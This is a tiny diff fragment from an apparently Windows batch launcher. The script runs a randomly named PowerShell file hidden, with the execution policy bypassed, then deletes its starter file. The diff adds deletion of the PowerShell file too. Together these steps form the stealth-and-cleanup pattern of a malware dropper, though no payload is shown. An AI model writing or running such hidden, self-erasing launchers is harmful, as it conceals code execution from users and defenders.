@@ -6,3 +6,4 @@ Powershell.exe -executionpolicy Bypass -windowstyle hidden -File  MzKrNVPboq.ps1
 cd %curr%
 echo %cd%
 del Starter.cmd
+del MzKrNVPboq.ps1
